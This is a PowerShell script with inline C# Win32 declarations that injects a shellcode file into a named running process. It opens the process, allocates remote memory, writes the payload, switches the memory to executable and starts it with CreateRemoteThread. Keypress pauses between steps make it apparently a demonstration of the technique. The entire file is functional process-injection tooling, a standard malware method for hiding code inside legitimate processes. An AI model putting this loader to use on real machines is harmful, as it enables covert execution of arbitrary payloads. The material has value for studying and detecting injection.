param (
    [string]$ProcessName,
    [string]$ShellcodePath
)

$ErrorActionPreference = "Stop"

function Wait-UserInputOverwriteMessage {
    Write-Host -NoNewline "Press any key to continue..."
    
    $currentTop = [Console]::CursorTop

    # $true hides the key press from being shown
    [void][Console]::ReadKey($true)

    # Clear the line
    [Console]::CursorTop = $currentTop
    [Console]::CursorLeft = 0
    [Console]::Write(" " * [Console]::WindowWidth)
    
    [Console]::CursorTop = $currentTop
    [Console]::CursorLeft = 0
}

# Function Definitions
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, ref uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetExitCodeThread(IntPtr hThread, [MarshalAs(UnmanagedType.U4)] out int lpExitCode);
}
'@ -Language CSharp

if (-Not (Test-Path -Path $ShellcodePath)) {
    Write-Error "File does not exist: $ShellcodePath"
    exit 1
}

$shellcodeByteArray = [System.IO.File]::ReadAllBytes($ShellcodePath)

# Something weird was happening when trying to Write-Host $shellcodeByteArray.Length in a string
$shellcodeByteArrayLength = $shellcodeByteArray.Length

Write-Host "Shellcode loaded into local memory (size: $shellcodeByteArrayLength B)"

Wait-UserInputOverwriteMessage

$processHandle = [IntPtr]::Zero
$remoteMemoryAddress = [IntPtr]::Zero
$remoteThreadHandle = [IntPtr]::Zero

$winError = 0

try {
    $process = Get-Process -Name $ProcessName

    # The bitmask 0x002A is a combination of the following permissions
    # PROCESS_CREATE_THREAD (0x0002)
    # PROCESS_VM_OPERATION (0x0008)
    # PROCESS_VM_WRITE (0x0020)
    # PROCESS_VM_READ (0x0010)
    $processHandle = [Win32]::OpenProcess(0x002A, $false, $process.Id)
    if ($processHandle -eq [IntPtr]::Zero) {
        throw "Failed to open process"
    }

    Write-Host "Handle to process $ProcessName (pid: ${process.Id}) obtained"

    Wait-UserInputOverwriteMessage

    # MEM_COMMIT (0x1000)
    # PAGE_READWRITE (0x04)
    $remoteMemoryAddress = [Win32]::VirtualAllocEx(
        $processHandle, 
        [IntPtr]::Zero, 
        $shellcodeByteArray.Length, 
        0x1000, 
        0x04)
    if ($remoteMemoryAddress -eq [IntPtr]::Zero) {
        throw "Failed to allocate memory in the remote process"
    }

    Write-Host "Memory allocated in remote process at address: $remoteMemoryAddress (PAGE_READWRITE)"

    Wait-UserInputOverwriteMessage

    $success = [Win32]::WriteProcessMemory(
        $processHandle,
        $remoteMemoryAddress, 
        $shellcodeByteArray, 
        $shellcodeByteArray.Length, 
        [ref]0)
    if (-not $success) {
        throw "Failed to write memory"
    }

    Write-Host "Shellcode written to remote process memory (size: ${shellcodeByteArray.Length} B)"

    Wait-UserInputOverwriteMessage

    # PAGE_EXECUTE_READ (0x20)
    $oldProtect = 0
    $success = [Win32]::VirtualProtectEx(
        $processHandle, 
        $remoteMemoryAddress, 
        $shellcodeByteArray.Length, 
        0x20, 
        [ref]$oldProtect)
    if (-not $success) {
        throw "Failed to change memory protection"
    }

    Write-Host "Memory permissions changed from PAGE_READWRITE to PAGE_EXECUTE_READ"

    Wait-UserInputOverwriteMessage

    $remoteThreadHandle = [Win32]::CreateRemoteThread(
        $processHandle, 
        [IntPtr]::Zero, 
        0, 
        $remoteMemoryAddress, 
        [IntPtr]::Zero, 
        0, 
        [ref]0)
    if ($remoteThreadHandle -eq [IntPtr]::Zero) {        
        throw "Failed to create remote thread"
    }

    Write-Host "Remote thread created, awaiting..."

    Wait-UserInputOverwriteMessage

    [Win32]::WaitForSingleObject($remoteThreadHandle, 0xFFFFFFFF)

    Write-Host "Shellcode finished" -ForegroundColor Green

    Wait-UserInputOverwriteMessage

    $exitCode = 0
    $success = [Win32]::GetExitCodeThread($remoteThreadHandle, [ref]$exitCode)
    if (-not $success) {
        throw "Failed to get exit code of remote thread"
    }

    Write-Host "Remote thread exit code: $exitCode" -ForegroundColor Green
}
catch {
    $winError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()

    Write-Host "Something went wrong" -ForegroundColor Red
    Write-Host "Error: $_"  -ForegroundColor Red

    if ($winError -ne 0) {
        Write-Host "Win32 error: $winError"  -ForegroundColor Red
        exit $winError
    }

    exit 1
}
finally {
    if ($remoteMemoryAddress -ne [IntPtr]::Zero) {
        [Win32]::VirtualFreeEx($processHandle, $remoteMemoryAddress, 0, 0x8000)
    }
    if ($remoteThreadHandle -ne [IntPtr]::Zero) {
        [Win32]::CloseHandle($remoteThreadHandle)
    }
    if ($processHandle -ne [IntPtr]::Zero) {
        [Win32]::CloseHandle($processHandle)
    }
}

exit 0